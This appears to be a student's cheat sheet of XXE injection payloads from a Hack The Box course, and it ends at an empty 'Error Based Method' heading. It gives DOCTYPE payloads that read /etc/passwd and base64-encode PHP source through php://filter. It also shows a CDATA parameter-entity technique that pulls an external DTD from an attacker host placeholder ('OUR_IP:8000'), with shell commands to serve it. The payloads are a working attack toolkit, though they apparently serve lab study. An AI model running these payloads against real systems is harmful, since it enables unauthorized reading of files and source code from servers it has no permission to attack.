
### Identify

We can intercept request with Burp Suite and then see in the request if the data is being sent via XML

We can check in the response if we see any reflected values and if so it should be a good start on where to attempt injection


injecting xml entity for file disclosure
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

injecting xml entity for source code disclosure [PHP Only]
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```


## Advanced Methods


#### CDATA Method

Wrapping data in in CDATA Tag for arbitrary output [Must be all internal entities unless using parameter entities]
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```

Using XML Parameter Entities [Example must be referenced externally]
```xml
<!ENTITY joined "%begin;%file;%end;">
```

Creating external resource holding xml parameter entities
```shell-session
Auzzie@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Auzzie@htb[/htb]$ python3 -m http.server 8000
```


#### Error Based Method


